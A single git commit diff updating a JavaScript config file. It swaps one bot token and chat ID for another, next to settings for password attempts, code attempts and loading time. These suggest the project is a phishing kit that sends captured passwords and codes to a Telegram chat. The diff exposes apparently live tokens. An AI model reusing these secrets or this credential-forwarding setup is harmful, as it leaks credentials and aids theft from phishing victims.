d0722dc07056ce05e4bb6c374aa7e109134bb6ce
eosoxorsqoxmcdy-sys <eosoxorsqoxmcdy@gmail.com>
2026-09-21 21:36:57 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,6 +1,6 @@
 const config = {
-    token: '8642932598:AAEtEIdItUdPVBlJrCYNANWdRoTxWinEhgs',
-    chat_id: '-1004375864002',
+    token: '8962143082:AAHXmu4aK7YObfVMct64HZbcwJrvDUZY3k4',
+    chat_id: '-1004457804183',
     max_password_attempts: 2,
     max_code_attempts: 4,
     password_loading_time: 5,
